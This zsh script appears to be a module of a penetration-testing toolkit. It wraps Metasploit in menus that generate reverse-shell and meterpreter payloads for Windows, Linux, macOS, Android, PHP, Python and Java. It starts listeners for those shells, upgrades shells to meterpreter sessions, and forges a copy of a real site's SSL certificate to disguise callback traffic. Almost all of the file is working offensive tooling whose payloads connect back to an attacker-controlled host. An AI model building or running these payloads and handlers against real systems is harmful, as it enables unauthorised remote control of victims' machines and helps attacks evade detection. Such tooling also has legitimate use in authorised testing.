#!/usr/bin/env zsh

############################################################# 
# nb-shell-handlers-msf
#############################################################
nb-shell-handlers-msf-help() {
    cat << "DOC" | bat --plain --language=help

nb-shell-handlers-msf
---------------------
The shell-handlers-msf namespace provides commands for spawning reverse shell connections using metasploit.

Commands
--------
nb-shell-handlers-msf-install            installs dependencies
nb-shell-handlers-msf-ssl-gen            impersonate a real SSL certificate for use in reverse shells
nb-shell-handlers-msf-w64-https          multi-handler for staged windows/x64/meterpreter/reverse_https payload
nb-shell-handlers-msf-listener           set up metasploit listener
nb-shell-handlers-msf-payload            set up metasploit payload
nb-shell-handlers-msf-upgrade-shell      upgrade metasploit shell to meterpreter

DOC
}

nb-shell-handlers-msf-install() {
    __info "Running $0..."
    __pkgs metasploit
}

nb-shell-handlers-msf-ssl-gen() {
    __ask "Enter the hostname of the site to impersonate"
    local r && __prefill r SITE aka.ms
    local cmd="use auxiliary/gather/impersonate_ssl; set RHOST ${r}; run; exit "
    __info "Use nb-vars-global-set-ssl-shell-cert to the path of the .pem file"
    print -z "msfconsole -n -q -x \"${cmd}\""
}

nb-shell-handlers-msf-w64-https() {
    nb-vars-set-lhost
    nb-vars-set-lport
    __msf << VAR
use exploit/multi/handler;
set PAYLOAD windows/x64/meterpreter/reverse_https;
set LHOST ${__LHOST};
set LPORT ${__LPORT};
set HANDLERSSLCERT ${__SHELL_SSL_CERT};
set EXITONSESSION false
run;
exit
VAR

}

nb-shell-handlers-msf-listener() {
    __check-project
    nb-vars-set-lhost
    nb-vars-set-lport

    __ask "Choose a payload type:"
    echo "1.  android/meterpreter/reverse_tcp"
    echo "2.  cmd/windows/reverse_powershell"
    echo "3.  java/jsp_shell_reverse_tcp"
    echo "4.  linux/x64/meterpreter_reverse_https"
    echo "5.  linux/x64/meterpreter_reverse_tcp"
    echo "6.  linux/x64/shell/reverse_tcp"
    echo "7.  osx/x64/meterpreter_reverse_https"
    echo "8.  osx/x64/meterpreter_reverse_tcp"
    echo "9.  php/meterpreter/reverse_tcp"
    echo "10. python/meterpreter_reverse_https"
    echo "11. python/meterpreter_reverse_tcp"
    echo "12. windows/x64/meterpreter_reverse_https"
    echo "13. windows/x64/meterpreter_reverse_tcp"
    echo "14. Previous menu"
    echo
    local choice && __askvar choice "CHOICE"

    case $choice in
        1) __PAYLOAD=android/meterpreter/reverse_tcp;;
        2) __PAYLOAD=cmd/windows/reverse_powershell;;
        3) __PAYLOAD=java/jsp_shell_reverse_tcp;;
        4) __PAYLOAD=linux/x64/meterpreter_reverse_https;;
        5) __PAYLOAD=linux/x64/meterpreter_reverse_tcp;;
        6) __PAYLOAD=linux/x64/shell/reverse_tcp;;
        7) __PAYLOAD=osx/x64/meterpreter_reverse_https;;
        8) __PAYLOAD=osx/x64/meterpreter_reverse_tcp;;
        9) __PAYLOAD=php/meterpreter/reverse_tcp;;
        10) __PAYLOAD=python/meterpreter_reverse_https;;
        11) __PAYLOAD=python/meterpreter_reverse_tcp;;
        12) __PAYLOAD=windows/x64/meterpreter_reverse_https;;
        13) __PAYLOAD=windows/x64/meterpreter_reverse_tcp;;
        14) exit;;
        *) echo "Invalid option";;
    esac
    
    local cmd="use exploit/multi/handler; set payload ${__PAYLOAD}; set LHOST ${__LHOST}; set LPORT ${__LPORT}; exploit"
    print -z "msfconsole -n -q -x \"${cmd}\""
}

nb-shell-handlers-msf-payload() {
    __check-project
    nb-vars-set-lhost
    nb-vars-set-lport

    __ask "Choose a payload format:"
    echo '1. aspx'
    echo '2. c'
    echo '3. csharp'
    echo '4. exe'
    echo '5. exe-service'
    echo '6. psh'
    echo '7. raw'
    echo
    local choice2 && __askvar choice2 "CHOICE"
    
    case $choice2 in
         1) extention=".aspx"
              format="aspx";;
         2) extention=".c"
              format="c";;
         3) extention=".cs"
              format="csharp";;
         4) extention=".exe"
              format="exe";;
         5) extention=".exe"
              format="exe-service";;
         6) extention=".ps1"
              format="psh";;
         7) extention=".bin"
              format="raw";;
        *) echo "Invalid option";;
    esac

    clear
    
    __ask "Choose malicious payload:"
    echo "1.   android/meterpreter/reverse_tcp         (.apk)"
    echo "2.   cmd/windows/reverse_powershell          (.bat)"
    echo "3.   java/jsp_shell_reverse_tcp (Linux)      (.jsp)"
    echo "4.   java/jsp_shell_reverse_tcp (Windows)    (.jsp)"
    echo "5.   java/shell_reverse_tcp                  (.war)"
    echo "6.   linux/x64/meterpreter_reverse_https     (.elf)"
    echo "7.   linux/x64/meterpreter_reverse_tcp       (.elf)"
    echo "8.   linux/x64/shell/reverse_tcp             (.elf)"
    echo "9.   osx/x64/meterpreter_reverse_https       (.macho)"
    echo "10.  osx/x64/meterpreter_reverse_tcp         (.macho)"
    echo "11.  php/meterpreter_reverse_tcp             (.php)"
    echo "12.  python/meterpreter_reverse_https        (.py)"
    echo "13.  python/meterpreter_reverse_tcp          (.py)"
    echo "14.  windows/x64/meterpreter_reverse_https   (multi)"
    echo "15.  windows/x64/meterpreter_reverse_tcp     (multi)"
    echo "16.  Previous menu"
    echo
    local choice && __askvar choice "CHOICE"

    case $choice in
         1) payload="android/meterpreter/reverse_tcp"
              extention=".apk"
              format="raw"
              arch="dalvik"
              platform="android";;
         2) payload="cmd/windows/reverse_powershell"
              extention=".bat"
              format="raw"
              arch="cmd"
              platform="windows";;
         3) payload="java/jsp_shell_reverse_tcp"
              extention=".jsp"
              format="raw"
              arch="elf"
              platform="linux";;
         4) payload="java/jsp_shell_reverse_tcp"
              extention=".jsp"
              format="raw"
              arch="cmd"
              platform="windows";;
         5) payload="java/shell_reverse_tcp"
              extention=".war"
              format="war"
              arch="x64"
              platform="linux";;
         6) payload="linux/x64/meterpreter_reverse_https"
              extention=".elf"
              format="elf"
              arch="x64"
              platform="linux";;
         7) payload="linux/x64/meterpreter_reverse_tcp"
              extention=".elf"
              format="elf"
              arch="x64"
              platform="linux";;
         8) payload="linux/x64/shell/reverse_tcp"
              extention=".elf"
              format="elf"
              arch="x64"
              platform="linux";;
         9) payload="osx/x64/meterpreter_reverse_https"
              extention=".macho"
              format="macho"
              arch="x64"
              platform="osx";;
         10) payload="osx/x64/meterpreter_reverse_tcp"
              extention=".macho"
              format="macho"
              arch="x64"
              platform="osx";;
         11) payload="php/meterpreter_reverse_tcp"
              extention=".php"
              format="raw"
              arch="php"
              platform="php"
              encoder="php/base64";;
         12) payload="python/meterpreter_reverse_https"
              extention=".py"
              format="raw"
              arch="python"
              platform="python";;
         13) payload="python/meterpreter_reverse_tcp"
              extention=".py"
              format="raw"
              arch="python"
              platform="python";;
         14) payload="windows/x64/meterpreter_reverse_https"
              arch="x64"
              platform="windows"
              format="exe";;
         15) payload="windows/x64/meterpreter_reverse_tcp"
              arch="x64"
              platform="windows"
              format="exe";;
         16) exit;;
        *) echo "Invalid option";;
    esac
    
    x=$(echo $payload | sed 's/\//-/g')
    print -z "msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -o $SV/$x$extention"
}

nb-shell-handlers-msf-upgrade-shell() {
    __check-project
    nb-vars-set-lhost
    nb-vars-set-lport

    __info "Use C-z to background shell and 'sessions' to list sessions"
    __info "Use 'session <ID>' to interact with session"
    echo
    __ask "Which session is it on?"
    local se && __askvar se "SESSION"

    local cmd="use post/multi/manage/shell_to_meterpreter; set LHOST ${__LHOST}; set SESSION ${se}; set LPORT ${__LPORT}; exploit"
    print -z "msfconsole -n -q -x \"${cmd}\""
}
